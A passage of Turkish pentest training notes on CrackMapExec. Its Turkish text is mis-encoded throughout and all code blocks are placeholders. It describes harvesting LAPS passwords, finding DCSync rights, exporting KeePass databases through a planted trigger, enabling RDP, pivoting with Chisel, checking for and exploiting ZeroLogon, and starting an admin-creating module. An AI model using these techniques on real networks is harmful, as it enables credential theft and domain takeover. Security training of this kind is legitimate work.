### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: BaÄŸlandÄ±ÄŸÄ±nÄ±z BloodHound veritabanÄ±na karÅŸÄ±lÄ±k gelen kullanÄ±cÄ± adÄ± ve parolayÄ± kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

### Bloodhound Verilerinin ToplanmasÄ±

BloodHound verilerini toplamak iÃ§in CrackMapExec kullanarak SharpHound'u Ã§alÄ±ÅŸtÄ±racak ve ardÄ±ndan dosyayÄ± saldÄ±rÄ± hostumuza aktaracaÄŸÄ±z.

### BloodHound verilerinin toplanmasÄ±

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Åimdi BloodHound'u aÃ§mamÄ±z ve verileri iÃ§e aktarmamÄ±z gerekiyor.


### BloodHound'da KullanÄ±cÄ±larÄ± Owned Olarak Ayarlama

Veriler iÃ§e aktarÄ±ldÄ±ktan sonra, `robert` kullanÄ±cÄ±sÄ± ile baÄŸlanmaya Ã§alÄ±ÅŸÄ±rsak, kullanÄ±cÄ±yÄ± BloodHound veritabanÄ±nda owned olunan olarak ayarlayacaktÄ±r.

### KullanÄ±cÄ± BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanÄ±cÄ±sÄ± olan bir makineyi tehlikeye atarsak da aynÄ± ÅŸey olacaktÄ±r. Bulunan tÃ¼m yeni kullanÄ±cÄ±larÄ± owned olarak ayarlayacaktÄ±r.

### Procdump ModÃ¼lÃ¼ ile KullanÄ±cÄ±larÄ± Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: TÃ¼m CrackMapExec seÃ§enekleri BloodHound veritabanÄ± ile senkronize olmayacaktÄ±r. Ã–rneÄŸin, `--ntds` veya `--lsa` seÃ§eneklerini denersek, kullanÄ±cÄ±larÄ± veritabanÄ±nda sahip olunan olarak iÅŸaretlemez, ancak `procdump` veya `lsassy` gibi modÃ¼ller kullanÄ±cÄ±larÄ± sahip olunan olarak iÅŸaretler.


### BloodHound'da BilgisayarlarÄ± Owned Olarak Ayarlama

YazÄ±m sÄ±rasÄ±nda, BloodHound entegrasyonu yalnÄ±zca user'larÄ± Owned olarak iÅŸaretlemektedir. Bir `computer` owned olarak iÅŸaretlemek istiyorsak, `bh_owned` modÃ¼lÃ¼nÃ¼ ve `neo4j` veritabanÄ±mÄ±zÄ±n kullanÄ±cÄ± adÄ± ve ÅŸifresini kullanabiliriz. AÅŸaÄŸÄ±daki Ã¶rnekte, diÄŸer varsayÄ±lan deÄŸerler neo4j veritabanÄ±mÄ±zla eÅŸleÅŸtiÄŸi iÃ§in yalnÄ±zca `PASS` seÃ§eneÄŸini ekleyeceÄŸiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, bÃ¼yÃ¼k aÄŸlarla uÄŸraÅŸÄ±rken birÃ§ok seÃ§enek sunar ve mÃ¼ÅŸterilerimizle paylaÅŸmak istememiz durumunda veritabanÄ±nÄ± gÃ¼ncellemenin hÄ±zlÄ± bir yoludur. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec'te mevcut olan bazÄ± popÃ¼ler modÃ¼llerle Ã§alÄ±ÅŸacaÄŸÄ±z.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici ÅŸeylerden biri, modÃ¼ler olmasÄ± ve herkesin modÃ¼ller oluÅŸturmasÄ±na ve bunlarÄ± araca katkÄ±da bulunmasÄ±na izin vermesidir. CrackMapExec, exploit ve exploit sonrasÄ± gÃ¶revleri kolaylaÅŸtÄ±rmak iÃ§in iÅŸlemler gerÃ§ekleÅŸtirmemizi saÄŸlayan 50'den fazla modÃ¼le sahiptir. Bu bÃ¶lÃ¼mde LDAP ve SMB protokolleri iÃ§in bu modÃ¼llerden bazÄ±larÄ± incelenecektir.


### LDAP Protocol Modules

LDAP protokolÃ¼ yaygÄ±n olarak Domain Controller'lar ile etkileÅŸime geÃ§memizi ve onlardan bilgi almamÄ±zÄ± saÄŸlar. Active Directory'den ilginÃ§ bilgiler Ã§Ä±karmamÄ±zÄ± saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.


### **LDAP Module - get-network**

`get-network` modÃ¼lÃ¼ [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'Ä±  temel alÄ±r. VarsayÄ±lan olarak, Active Directory'deki herhangi bir kullanÄ±cÄ±, `zone transferine` benzer ÅŸekilde Domain veya Forest DNS bÃ¶lgelerindeki tÃ¼m DNS kayÄ±tlarÄ±nÄ± numaralandÄ±rabilir. Bu araÃ§, internal aÄŸlarÄ±n yeniden yapÄ±landÄ±rÄ±lmasÄ± amacÄ±yla bÃ¶lgedeki tÃ¼m DNS kayÄ±tlarÄ±nÄ±n numaralandÄ±rÄ±lmasÄ±nÄ± ve dÄ±ÅŸa aktarÄ±lmasÄ±nÄ± saÄŸlar.

ModÃ¼lÃ¼ kullanmanÄ±n Ã¼Ã§ (3) yolu vardÄ±r:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adlarÄ±).

VarsayÄ±lan olarak, herhangi bir seÃ§enek belirtmezsek, modÃ¼l yalnÄ±zca IP adresini alacaktÄ±r. `ALL=true` seÃ§eneÄŸini seÃ§ersek, hem IP hem de domain adlarÄ±nÄ± alÄ±r ve `ONLY_HOSTS=true` olarak belirtirsek, yalnÄ±zca FQDN'yi alÄ±rÄ±z.


### DNS Sunucusundan (Record) KayÄ±tlarÄ± Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazÄ±nÄ±n yazÄ±ldÄ±ÄŸÄ± zamanda, modÃ¼l **`adidnsdump`** aracÄ±yla bazÄ± farklÄ±lÄ±klar gÃ¶stermektedir. SonuÃ§lar, hesaplar arasÄ±nda farklÄ±lÄ±k gÃ¶sterebilir.


### LDAP Module - laps

Bir baÅŸka harika modÃ¼l de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e baÄŸlÄ± bilgisayarlarda local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL'ler tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca belirli kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya `parola sÄ±fÄ±rlama` talebinde bulunabilir. Laps modÃ¼lÃ¼ ile bir hesabÄ±n okuma eriÅŸimine sahip olduÄŸu tÃ¼m bilgisayarlarÄ± alabiliriz. Bir bilgisayarÄ± belirtmek iÃ§in `COMPUTER` seÃ§eneÄŸini de kullanabilir veya benzer ada sahip birkaÃ§ bilgisayarÄ± almak iÃ§in bir wildcard karakterle birlikte kullanabiliriz.


### LAPS ModÃ¼lÃ¼ ParolalarÄ±n AlÄ±nmasÄ±

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: KullanÄ±lan parola bir Ã¶rnektir. Hedef hostta Ã§alÄ±ÅŸmayacaktÄ±r

### LDAP ModÃ¼lÃ¼ - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'Ã¼ ile temsil edilen ve varsayÄ±lan olarak bir **user**'Ä±n bir **domain** iÃ§inde oluÅŸturabileceÄŸi **computer account** sayÄ±sÄ±nÄ± belirten bir **domain level attribute**'tÃ¼r.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazÄ± **attack** senaryolarÄ±nda **domain** iÃ§inde bir **machine** oluÅŸturmak gerekebilir, bu yÃ¼zden **account machine quota attribute**'Ã¼nÃ¼ **enumerate** etmek Ã¶nemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir baÅŸka harika modÃ¼l ise bir veya birden fazla object'in `DACL`'lerini okumamÄ±zÄ± ve dÄ±ÅŸa aktarmamÄ±zÄ± saÄŸlayan `daclread`'dir. Bu modÃ¼l Active Directory eriÅŸimini numaralandÄ±rmamÄ±zÄ± saÄŸlayacaktÄ±r. AÅŸaÄŸÄ±daki seÃ§eneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabÄ±nÄ±n tÃ¼m **ACE**'lerini okumak istiyoruz. Bunun iÃ§in **`TARGET`** seÃ§eneÄŸini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace KullanÄ±cÄ±sÄ±nÄ±n DACL'sini Oku

{{CODE_BLOCK_203}}


AyrÄ±ca belirli haklarÄ± da arayabiliriz, Ã¶rneÄŸin hangi **principal**'larÄ±n **DCSync** haklarÄ±na sahip olduÄŸunu. Bunun iÃ§in **`TARGET_DN`** seÃ§eneÄŸini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seÃ§eneÄŸini seÃ§memiz ve aramak istediÄŸimiz haklarÄ± **`RIGHTS`** seÃ§eneÄŸiyle belirlememiz gerekir.

### DCSync Rights'a Sahip KullanÄ±cÄ±larÄ± Arama

{{CODE_BLOCK_204}}



Ã‡Ä±ktÄ±da gÃ¶sterildiÄŸi gibi, `ACE[4]` `robert` kullanÄ±cÄ±sÄ±nÄ±n hedef domain'de `DCSync` haklarÄ±na sahip olduÄŸunu gÃ¶sterir.

LDAP'ta birkaÃ§ modÃ¼l daha kullanabiliriz. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolÃ¼nde daha fazla modÃ¼l mevcuttur. CrackMapExec modÃ¼lÃ¼nde yaptÄ±ÄŸÄ±mÄ±z ÅŸeylerin Ã§oÄŸu SMB protokolÃ¼nÃ¼ kullanÄ±r. Ä°lginÃ§ bilgiler elde etmemizi saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.

Not: SMB kullanan modÃ¼llerin Ã§oÄŸunun Ã§alÄ±ÅŸmasÄ± iÃ§in admin haklarÄ±na ( `Pwned!` ) ihtiyaÃ§ vardÄ±r.


### SMB ModÃ¼lleri - get_netconnections ve ioxidresolver

Bir aÄŸ pentesti Ã¼zerinde Ã§alÄ±ÅŸÄ±rken, sÃ¼rekli olarak daha fazla kaynaÄŸa veya aÄŸa eriÅŸim elde etmeye Ã§alÄ±ÅŸÄ±rÄ±z. CrackMapExec, daha Ã¶nce tehlikeye attÄ±ÄŸÄ±mÄ±z bir makineyi numaralandÄ±rmamÄ±za ve birden fazla aÄŸ yapÄ±landÄ±rmasÄ±na sahip olup olmadÄ±ÄŸÄ±nÄ± belirlememize olanak tanÄ±yan bazÄ± modÃ¼llere sahiptir. `get_netconnections` ve `ioxidresolver` modÃ¼llerini kullanalÄ±m ve farklarÄ±nÄ± gÃ¶relim.

`get_netconnections` modÃ¼lÃ¼, aÄŸ baÄŸlantÄ±larÄ±nÄ± sorgulamak iÃ§in `WMI` kullanÄ±r. `IPv6` ve herhangi bir ikincil IP dahil olmak Ã¼zere tÃ¼m IP adreslerinin yanÄ± sÄ±ra domain adÄ±nÄ± da alÄ±r.


### get_netconnections Module

{{CODE_BLOCK_206}}


Ã–te yandan, `ioxidresolver` modÃ¼lÃ¼ IP adreslerini sorgulamak iÃ§in RPC kullanÄ±r. Ancak, bu modÃ¼l `IPv6` adreslerini iÃ§ermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: Ä°htiyaÃ§larÄ±mÄ±za en uygun olanÄ± seÃ§ebilmemiz iÃ§in bir modÃ¼lÃ¼n nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± anlamak Ã¶nemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal aÄŸlarda adminler ve kullanÄ±cÄ±lar tarafÄ±ndan parolalarÄ± ve gizli bilgileri tek bir veritabanÄ±nda saklamak iÃ§in yaygÄ±n olarak kullanÄ±lan Ã¼cretsiz, aÃ§Ä±k kaynaklÄ± bir password manager'dÄ±r. Bir master password onu korur. Bir KeePass veritabanÄ± alÄ±rsak, onu aÃ§mak iÃ§in ÅŸifresine ihtiyacÄ±mÄ±z vardÄ±r.

### KeePass'i KeÅŸfetme

{{CODE_BLOCK_208}}

EÄŸer master parolaya sahip deÄŸilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafÄ±ndan geliÅŸtirilen ve veritabanÄ±nÄ± aÃ§Ä±k metin olarak dÄ±ÅŸa aktarmak iÃ§in KeePass'Ä±n triger sistemini kullanan bir teknik kullanmaktÄ±r. KeePass yapÄ±landÄ±rma dosyasÄ±nÄ±, veritabanÄ±nÄ± otomatik olarak aÃ§Ä±k metin olarak dÄ±ÅŸa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) iÃ§erecek ÅŸekilde deÄŸiÅŸtirir.

Bunu kullanmak iÃ§in beÅŸ (5) adÄ±ma ihtiyacÄ±mÄ±z var:

*  KeePass yapÄ±landÄ±rma dosyasÄ±nÄ± bulun. Biz bunu `keepass_discover` modÃ¼lÃ¼ ile yaptÄ±k.
 * `ACTION=ADD` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH` Ã¶ÄŸesini kullanarak trigger'Ä± yapÄ±landÄ±rma dosyasÄ±na ekleyin.

### KeePass YapÄ±landÄ±rma DosyasÄ±na Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapÄ±landÄ±rma yolu iÃ§in ters eÄŸik Ã§izgi (`/`) veya Ã§ift eÄŸik Ã§izgi (`\`) kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

* KullanÄ±cÄ±nÄ±n KeePass'i aÃ§masÄ±nÄ± ve master parolayÄ± girmesini bekleyin. Bu iÅŸlemi zorlamak iÃ§in `ACTION=RESTART` seÃ§eneÄŸini kullanarak KeePass.exe prosesini yeniden baÅŸlatabiliriz. Hedef makinede oturum aÃ§mÄ±ÅŸ Ã§ok sayÄ±da kullanÄ±cÄ± varsa, `USER=julio` gibi kullanÄ±cÄ± adÄ± ile `USER` seÃ§eneÄŸini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seÃ§eneÄŸini kullanarak export edilen veritabanÄ±nÄ± makinemize sorgulayÄ±n. Daha sonra ÅŸifre giriÅŸlerini aramak iÃ§in grep kullanabiliriz.


### Ele GeÃ§irilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapÄ±landÄ±rma dosyasÄ±nÄ± temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modÃ¼lÃ¼n her seÃ§eneÄŸini Ã¶ÄŸrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seÃ§eneÄŸin iyi yanÄ±, **extract_password** yÃ¶ntemini de iÃ§ermesidir; bu yÃ¶ntem **.xml** dosyasÄ±nda herhangi bir parola giriÅŸini arar ve konsola yazdÄ±rÄ±r.


### keeppass_trigger TÃœMÃœNÃœ Tek Komutta Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_214}}

Not: ModÃ¼l ÅŸifreyi yazdÄ±rÄ±rken sorun yaÅŸayabilir. Bir hata alabiliriz, ancak ÅŸifre `/tmp/export.xml` dosyasÄ±nda olacaktÄ±r, bÃ¶ylece manuel olarak alabiliriz.

### RDP'yi EtkinleÅŸtirme veya Devre DÄ±ÅŸÄ± BÄ±rakma

DeÄŸerlendirme yaparken yapmak isteyebileceÄŸimiz yaygÄ±n bir gÃ¶rev, RDP aracÄ±lÄ±ÄŸÄ±yla bir hedef makineye baÄŸlanmaktÄ±r. Bu, baÅŸka tÃ¼rlÃ¼ lateral hareket saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtiremediÄŸimiz veya standart bir protokol kullanarak radarÄ±n altÄ±ndan geÃ§mek istediÄŸimiz bazÄ± senaryolarda yararlÄ± olabilir.

BaÄŸlanmak istediÄŸimiz makinede RDP etkin deÄŸilse, buna izin vermek iÃ§in RDP modÃ¼lÃ¼nÃ¼ kullanabiliriz. `ACTION` seÃ§eneÄŸini ve ardÄ±ndan `enable` veya `disable` seÃ§eneklerini belirtmemiz gerekir.


### RDP'yi EtkinleÅŸtirme

{{CODE_BLOCK_215}}


SMB'de birkaÃ§ modÃ¼l daha vardÄ±r. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bÃ¶lÃ¼mde, ZeroLogon gibi bilinen gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanan diÄŸer SMB modÃ¼llerine bakacaÄŸÄ±z

### Vulnerability Scan Modules

SÄ±zma testi yaparken gerÃ§ekleÅŸtirdiÄŸimiz gÃ¼nlÃ¼k faaliyetlerden biri gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmeye Ã§alÄ±ÅŸmaktÄ±r. EÄŸer herhangi birini bulabilirsek, exploitation iÅŸi basit olabilir.

CrackMapExec, gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmemizi saÄŸlayan bazÄ± modÃ¼ller iÃ§erir. Bu oturumda bunlardan bazÄ±larÄ±nÄ± inceleyeceÄŸiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geÃ§irdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki aÄŸ kartÄ± var ve amacÄ±mÄ±z domainin saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek. Domainin IP adresi `172.16.10.3`'tÃ¼r.

Domain'e eriÅŸim saÄŸlamak iÃ§in, CME ile ProxyChain bÃ¶lÃ¼mÃ¼nde Ã¶ÄŸrendiklerimizi kullanacaÄŸÄ±z ve Chisel ile bir baÄŸlantÄ± kuracaÄŸÄ±z


### Chisel'i Hedef Makineye GÃ¶nderme

{{CODE_BLOCK_217}}


### SaldÄ±rÄ± Hostumuzda Chisel'Ä± Sunucu Olarak Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_218}}


### Chisel'Ä± Tehlikeye DÃ¼ÅŸmÃ¼ÅŸ Cihazdan SaldÄ±rÄ± Hostumuza BaÄŸlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki gÃ¼venlik aÃ§Ä±ÄŸÄ± modÃ¼llerinin Ã§oÄŸu yalnÄ±zca kontrol edilir ve bu modÃ¼lleri gÃ¼venlik aÃ§Ä±klarÄ±ndan yararlanmak iÃ§in kullanamayÄ±z. [ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile baÅŸlayalÄ±m.


### ZeroLogon

KimliÄŸi doÄŸrulanmamÄ±ÅŸ bir saldÄ±rgan, bir domain controller'a aÄŸ eriÅŸimi ile[ ZeroLogon gÃ¼venlik aÃ§Ä±ÄŸÄ±ndan (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kÃ¶tÃ¼ye kullanmak ve sonunda domain'in controller'Ä± ele geÃ§irmek iÃ§in savunmasÄ±z bir Netlogon session'Ä± baÅŸlatmasÄ± gerekir. Bir Domain Controller'a baÄŸlanmak baÅŸarÄ±lÄ± bir saldÄ±rÄ± iÃ§in tek Ã¶n koÅŸul olduÄŸundan, gÃ¼venlik aÃ§Ä±ÄŸÄ± ciddidir.

CrackMapExec, bir Domain Controller'Ä±n ZeroLogon'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan zerologon adlÄ± bir modÃ¼l iÃ§erir.


### ZeroLogon GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_220}}


### PetitPotam

GÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± [Gilles Lionel](https://twitter.com/topotam77) kÄ±sa bir sÃ¼re Ã¶nce [PetitPotam](https://github.com/topotam/PetitPotam) adÄ± verilen ve saldÄ±rganlarÄ±n sadece kurumsal aÄŸ altyapÄ±sÄ±na eriÅŸim saÄŸlayarak domain'i tehlikeye atmasÄ±na olanak tanÄ±yan bir saldÄ±rÄ± tekniÄŸini ortaya Ã§Ä±kardÄ±. YÃ¶ntem, sunulan herhangi bir sunucu servisine (Ã¶rneÄŸin bir Domain Controller) yÃ¶nelik klasik bir `NTLM relay` saldÄ±rÄ±sÄ±dÄ±r. Lionel ayrÄ±ca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldÄ±rganlarÄ±n domain'i ele geÃ§irmek iÃ§in bu Ã¶zel saldÄ±rÄ± tekniÄŸini nasÄ±l kullanabileceklerini gÃ¶steren bir proof of  concept kodu da yayÄ±nladÄ±.

CrackMapExec, bir Domain Controller'Ä±n PetitPotam'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan `petitpotam` adlÄ± bir modÃ¼l iÃ§erir.


### Petitpotam GÃ¼venlik AÃ§Ä±ÄŸÄ± KontrolÃ¼

{{CODE_BLOCK_221}}


### noPAC

noPAC gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ±n exploit'i, normal bir domain kullanÄ±cÄ±sÄ±nÄ±n ayrÄ±calÄ±klarÄ±nÄ±n bir domain admin yÃ¼kseltilmesine izin verdi. Kavram kanÄ±tÄ± (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayÄ±nlandÄ±.

CrackMapExec, bir domain controller'Ä±n noPAC'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± tanÄ±mlayan nopac adlÄ± bir modÃ¼l iÃ§erir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlÄ± bir NTLM relay saldÄ±rÄ±sÄ± iÃ§in bir kavram kanÄ±tÄ± ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayÄ±nladÄ±. YÃ¶ntem, bir Windows domain'inin controller'Ä± ele geÃ§irmek iÃ§in Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolÃ¼nÃ¼ ele geÃ§iriyor.

Bu saldÄ±rÄ± bir domain kullanÄ±cÄ±sÄ± gerektirir ve bir DC'nin savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in CrackMapExec modÃ¼lÃ¼ `dfscoerce`'yi kullanabiliriz. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± kontrol etmek iÃ§in `Y3t4n0th3rP4ssw0rd` ÅŸifresiyle `carole.holmes` hesabÄ±nÄ± kullanacaÄŸÄ±z.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, gÃ¼venlik araÅŸtÄ±rmacÄ±sÄ± Lionel Gilles tarafÄ±ndan 2021'in sonlarÄ±nda PetitPotam saldÄ±rÄ±sÄ±nÄ± sergileyen bir sunumun sonunda keÅŸfedildi ve ilk kez detaylandÄ±rÄ±ldÄ±. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanÄ±tÄ± ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluÅŸturdu.

CrackMapExec modÃ¼lÃ¼ shadowcoerce kullanarak DC'nin bu saldÄ±rÄ±ya karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in carole.holmes hesabÄ±nÄ± kullanalÄ±m.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


GÃ¼venlik aÃ§Ä±ÄŸÄ± tarama modÃ¼llerinin Ã§oÄŸu yazarÄ±, bilgisayarÄ±n gÃ¼venlik aÃ§Ä±ÄŸÄ± olup olmadÄ±ÄŸÄ±na dair bir mesaj eklememiÅŸtir, bu nedenle komut Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ktan sonra hiÃ§bir ÅŸey gÃ¶rmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modÃ¼lÃ¼nÃ¼n kaynak kodunu kontrol edersek, yazarÄ±n ( `logging.debug` ) ile bazÄ± debug log'larÄ± eklediÄŸini gÃ¶receÄŸiz. CrackMapExec'i hata debug modunda Ã§alÄ±ÅŸtÄ±rÄ±rsak, bu loglarÄ± yazdÄ±racaktÄ±r.

CrackMapExec'i debug modunda Ã§alÄ±ÅŸtÄ±rmak iÃ§in protokolden Ã¶nce `--verbose` seÃ§eneÄŸini kullanabiliriz


### shadowcoerce ModÃ¼lÃ¼nÃ¼ Verbose Enabled ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_225}}


`DEBUG` ile baÅŸlayan satÄ±rlar `logging.debug`'a karÅŸÄ±lÄ±k gelir. Son satÄ±rlarda hedefin savunmasÄ±z olmadÄ±ÄŸÄ±nÄ± gÃ¶sterdiÄŸini gÃ¶rebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diÄŸer adÄ±yla EternalBlue, Windows iÅŸletim sistemleri iÃ§in Microsft tarafÄ±ndan 14 Mart 2017 tarihinde yayÄ±nlanan bir gÃ¼venlik yamasÄ±dÄ±r. Yama, SMB servisindeki kritik bir kimliÄŸi doÄŸrulanmamÄ±ÅŸ remote kod Ã§alÄ±ÅŸtÄ±rma aÃ§Ä±ÄŸÄ± iÃ§indir. Bu gÃ¼venlik aÃ§Ä±ÄŸÄ± hakkÄ±nda daha fazla bilgi edinmek iÃ§in [Microsoft GÃ¼venlik BÃ¼lteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'Ä±n MS17-010'a karÅŸÄ± savunmasÄ±z olup olmadÄ±ÄŸÄ±nÄ± belirleyen ms17-010 adlÄ± bir modÃ¼l iÃ§erir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### GÃ¼venlik AÃ§Ä±ÄŸÄ±ndan Yararlanma

BirÃ§ok gÃ¼venlik aÃ§Ä±ÄŸÄ± gÃ¶rdÃ¼k. Onlardan birini exploit etmeye Ã§alÄ±ÅŸalÄ±m: ZeroLogon. ModÃ¼l tarafÄ±ndan saÄŸlanan baÄŸlantÄ±ya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalÄ±m:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geÃ§tikÃ§e yeni gÃ¼venlik aÃ§Ä±klarÄ± ortaya Ã§Ä±kacaktÄ±r ve bunlar sektÃ¶r uzmanlarÄ± veya bizim tarafÄ±mÄ±zdan CrackMapExec'e modÃ¼l olarak eklenebilir. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec iÃ§in nasÄ±l bir modÃ¼l oluÅŸturabileceÄŸimizi gÃ¶receÄŸiz.

---

### Kendi CME ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturmak

Yazarlar ve topluluk tarafÄ±ndan oluÅŸturulan birÃ§ok yerleÅŸik CrackMapExec modÃ¼lÃ¼nÃ¼ kullandÄ±k. Bu bÃ¶lÃ¼mde CrackMapExec iÃ§in modÃ¼lÃ¼mÃ¼zÃ¼ nasÄ±l yapabileceÄŸimizi keÅŸfedeceÄŸiz.


### CrackMapExec'i Poetry ile derleyin

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturmadan Ã¶nce, CrackMapExec projesinin nasÄ±l derleneceÄŸini bilmek Ã§ok Ã¶nemlidir. Bu amaÃ§la CME, projelerimizi oluÅŸtururken Ã¶nerilen [Poetry](https://python-poetry.org/)'yi kullanÄ±r. Poetry kullanmÄ±yorsanÄ±z, CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak Ã¼zere Poetry kullanmaya baÅŸlamak iÃ§in Kurulum ve Binaryler bÃ¶lÃ¼mÃ¼ne bir gÃ¶z atÄ±n

Åimdi kodu en sevdiÄŸimiz IDE ile aÃ§abiliriz. Bu bÃ¶lÃ¼mde [VSCode](https://code.visualstudio.com/) kullanacaÄŸÄ±z. VSCode'u [kurmak](https://code.visualstudio.com/download) iÃ§in .deb dosyasÄ±nÄ± kendi web sitesinden indirmemiz gerekiyor. DoÄŸrudan indirme baÄŸlantÄ±sÄ± [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un KurulmasÄ± ve Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ±

{{CODE_BLOCK_229}}

Daha sonra aÃ§mak iÃ§in `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturun

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturalÄ±m. Yeni bir administrator hesabÄ± oluÅŸturacak basit bir script oluÅŸturacaÄŸÄ±z.

* ./CrackMapExec/cme/modules klasÃ¶rÃ¼ altÄ±nda `createadmin.py` adÄ±nda bir dosya oluÅŸturun.
